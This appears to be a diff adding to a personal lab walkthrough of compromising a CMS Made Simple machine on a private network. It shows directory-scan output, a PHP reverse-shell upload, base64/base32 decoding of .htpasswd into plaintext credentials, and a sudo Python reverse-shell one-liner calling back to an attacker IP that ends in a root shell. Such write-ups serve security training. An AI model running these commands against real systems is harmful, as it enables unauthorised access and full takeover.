@@ -148,3 +148,129 @@ MySQL [cmsms_db]> update cms_users set password = (select md5(CONCAT(IFNULL((SEL
 Query OK, 1 row affected (0.010 sec)
 Rows matched: 1  Changed: 1  Warnings: 0
 
+└─$ sudo dirsearch -u 172.16.85.135
+[sudo] password for kali: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           
+ (_||| _) (/_(_|| (_| )                                                                                                                                    
+                                                                                                                                                           
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/reports/_172.16.85.135/_24-05-12_21-26-32.txt
+
+Target: http://172.16.85.135/
+
+[21:26:33] Starting:                                                                                                                                       
+[21:26:34] 403 -  278B  - /.ht_wsr.txt                                      
+[21:26:34] 403 -  278B  - /.htaccess.sample                                 
+[21:26:34] 403 -  278B  - /.htaccess.orig                                   
+[21:26:34] 403 -  278B  - /.htaccess.save                                   
+[21:26:34] 403 -  278B  - /.htaccess.bak1
+[21:26:34] 403 -  278B  - /.htaccess_sc                                     
+[21:26:34] 403 -  278B  - /.htaccess_orig
+[21:26:34] 403 -  278B  - /.htaccessOLD
+[21:26:34] 403 -  278B  - /.htaccess_extra
+[21:26:34] 403 -  278B  - /.htaccessOLD2
+[21:26:34] 403 -  278B  - /.htaccessBAK                                     
+[21:26:34] 403 -  278B  - /.html                                            
+[21:26:34] 403 -  278B  - /.htpasswd_test                                   
+[21:26:34] 403 -  278B  - /.httr-oauth
+[21:26:34] 403 -  278B  - /.htm
+[21:26:34] 403 -  278B  - /.htpasswds                                       
+[21:26:34] 403 -  278B  - /.php                                             
+[21:26:36] 301 -  314B  - /admin  ->  http://172.16.85.135/admin/           
+[21:26:36] 302 -    0B  - /admin/  ->  http://172.16.85.135/admin/login.php 
+[21:26:36] 302 -    0B  - /admin/index.php  ->  http://172.16.85.135/admin/login.php
+[21:26:36] 200 -    1KB - /admin/login.php                                  
+[21:26:39] 301 -  315B  - /assets  ->  http://172.16.85.135/assets/         
+[21:26:39] 200 -  519B  - /assets/                                          
+[21:26:40] 403 -  278B  - /cgi-bin/                                         
+[21:26:41] 200 -    0B  - /config.php                                       
+[21:26:42] 301 -  312B  - /doc  ->  http://172.16.85.135/doc/               
+[21:26:42] 200 -   24B  - /doc/
+[21:26:45] 404 -  225B  - /index.php/login/                                 
+[21:26:46] 301 -  312B  - /lib  ->  http://172.16.85.135/lib/               
+[21:26:46] 200 -   24B  - /lib/                                             
+[21:26:47] 200 -  586B  - /modules/                                         
+[21:26:47] 301 -  316B  - /modules  ->  http://172.16.85.135/modules/       
+[21:26:49] 200 -   24KB - /phpinfo.php                                      
+[21:26:49] 401 -  460B  - /phpmyadmin                                       
+[21:26:50] 401 -  460B  - /phpmyadmin/                                      
+[21:26:50] 401 -  460B  - /phpmyadmin/ChangeLog                             
+[21:26:50] 401 -  460B  - /phpmyadmin/doc/html/index.html
+[21:26:50] 401 -  460B  - /phpmyadmin/index.php                             
+[21:26:50] 401 -  460B  - /phpmyadmin/README
+[21:26:50] 401 -  460B  - /phpmyadmin/phpmyadmin/index.php
+[21:26:50] 401 -  460B  - /phpmyadmin/scripts/setup.php                     
+[21:26:50] 401 -  460B  - /phpmyadmin/docs/html/index.html                  
+[21:26:52] 403 -  278B  - /server-status                                    
+[21:26:52] 403 -  278B  - /server-status/                                   
+[21:26:54] 301 -  312B  - /tmp  ->  http://172.16.85.135/tmp/               
+[21:26:54] 200 -  460B  - /tmp/                                             
+[21:26:55] 301 -  316B  - /uploads  ->  http://172.16.85.135/uploads/       
+[21:26:55] 200 -    0B  - /uploads/     
+
+
+
+http://172.16.85.135/admin/moduleinterface.php
+#on this page, "file manager" upload file on the site,file filter is enbaled. So upload a normal named shell file ,then
+move it to another fold on the site, then view it, a shell will be poped.
+cp /usr/share/webshells/php/php-reverse-shell.php .
+
+└─$ nc -nvlp 80                           
+listening on [any] 80 ...
+connect to [172.16.85.133] from (UNKNOWN) [172.16.85.135] 50244
+Linux mycmsms 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
+ 18:36:18 up 2 days, 21:19,  0 users,  load average: 0.02, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
+
+$ cd /var/www/html
+$ ls -la
+total 340
+drwxr-xr-x  6 www-data www-data  4096 Jun 24  2020 .
+drwxr-xr-x 10 root     root      4096 May 31  2020 ..
+-rw-r--r--  1 www-data www-data   472 Mar 26  2020 .htaccess
+-rw-r--r--  1 www-data www-data    45 Jun 24  2020 .htpasswd
+-rw-r--r--  1 www-data www-data  3279 Mar 26  2020 addbookmark.php
+-rw-r--r--  1 www-data www-data  4324 Mar 26  2020 addgroup.php
+-rw-r--r--  1 www-data www-data  6928 Mar 26  2020 adduser.php
+-rw-r--r--  1 www-data www-data  7241 Mar 26  2020 adminlog.php
+
+$ cat .htpasswd 
+TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=   #it seems as base64 encoded piece of word
+
+
+#cyberchef magic
+From_Base64('A-Za-z0-9+/=',true,false)
+From_Base32('A-Z2-7=',false)
+
+    armour:Shield@123
+
+$ su armour
+Password: Shield@123
+id
+uid=1000(armour) gid=1000(armour) groups=1000(armour),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+sudo -l
+Matching Defaults entries for armour on mycmsms:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User armour may run the following commands on mycmsms:
+    (root) NOPASSWD: /usr/bin/python
+
+#reverse shell
+sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.85.133",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ 
+
+ └─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [172.16.85.133] from (UNKNOWN) [172.16.85.135] 49896
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
